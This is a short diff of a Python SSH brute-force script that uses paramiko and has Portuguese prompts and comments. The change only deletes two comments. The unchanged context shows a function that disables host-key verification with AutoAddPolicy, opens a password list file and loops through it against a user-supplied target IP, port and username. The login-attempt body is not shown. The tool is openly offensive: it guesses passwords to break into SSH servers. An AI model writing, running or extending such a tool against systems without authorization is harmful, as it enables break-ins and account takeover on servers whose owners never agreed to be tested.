@@ -9,7 +9,7 @@ def display_banner():
 
 def ssh_brute_force(host, port, user, password_list):
     client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Ignora validação do host
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
 
     with open(password_list, "r") as passwords:
         for password in passwords:
@@ -29,7 +29,7 @@ def ssh_brute_force(host, port, user, password_list):
     client.close()
 
 if __name__ == "__main__":
-    display_banner()  # Exibe o banner
+    display_banner()  
     host = input("IP do servidor: ")
     port = int(input("Porta SSH (padrão 22): ") or 22)
     user = input("Nome de usuário: ")
